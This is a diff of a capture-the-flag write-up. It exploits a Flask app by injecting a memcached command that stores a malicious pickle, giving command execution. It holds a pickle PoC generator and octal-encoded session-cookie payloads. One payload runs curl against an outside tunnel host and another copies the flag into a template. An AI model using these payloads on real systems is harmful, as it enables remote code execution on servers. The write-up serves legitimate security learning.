@@ -30,6 +30,7 @@ layout:
 
 We can download the source code and see most of the app's functionality is in `app.py`.
 
+{% code overflow="wrap" %}
 ```python
 import pylibmc, uuid, sys
 from flask import Flask, session, request, redirect, render_template
@@ -77,6 +78,7 @@ def main():
     uicolor = session.get("uicolor", "#f1f1f1")
     return render_template("index.html", uicolor=uicolor)
 ```
+{% endcode %}
 
 ## Solution
 
@@ -96,6 +98,7 @@ Next, we want to encode a payload. Since [python pickle](https://docs.python.org
 
 Let's jump straight into testing the PoC! The only thing I changed is the command to `curl` (we want to verify the command executes) and the cache key/name to `420`.
 
+{% code overflow="wrap" %}
 ```python
 import pickle
 import os
@@ -129,12 +132,15 @@ def generate_exploit():
 
 print(generate_exploit())
 ```
+{% endcode %}
 
 We generate the payload, then simply replace our cookie value and make a call to the `/set` endpoint.
 
+{% code overflow="wrap" %}
 ```bash
 "\061\063\067\015\012\163\145\164\040\102\124\137\072\064\062\060\040\060\040\062\065\071\062\060\060\060\040\066\061\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\143\165\162\154\040\150\164\164\160\163\072\057\057\143\141\164\056\164\165\156\156\145\154\164\157\056\144\145\166\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\102\124\137\072\064\062\060"
 ```
+{% endcode %}
 
 I struggled for a while here, until I realised that `curl` is not installed on the machine lol 🤦‍♂️ If we change the command to `whoami` and test locally, we'll see `root` pop up in the logs 🙏
 
@@ -142,6 +148,7 @@ Furthermore, if we update the command to `cat /flag*.txt`, the flag will be prin
 
 I tried to get a reverse shell, but it never made the connection (although I heard later others did have success with this). Ultimately, I ended up changing the `cmd` to `cp /flag*.txt application/templates/index.html`.
 
+{% code overflow="wrap" %}
 ```bash
 GET /set?uicolour=cat HTTP/1.1
 Host: 127.0.0.1:1337
@@ -153,6 +160,7 @@ DNT: 1
 Connection: close
 Cookie: session="\061\063\067\015\012\163\145\164\040\102\124\137\072\064\062\060\040\060\040\062\065\071\062\060\060\060\040\067\070\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\143\160\040\057\146\154\141\147\052\056\164\170\164\040\141\160\160\154\151\143\141\164\151\157\156\057\164\145\155\160\154\141\164\145\163\057\151\156\144\145\170\056\150\164\155\154\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\102\124\137\072\064\062\060"
 ```
+{% endcode %}
 
 We might need to send the request several times, as the server seems to crash regularly. Eventually, the command will execute and `index.html` will be replaced with the flag. Therefore, when we follow the redirect, the flag is displayed.
 
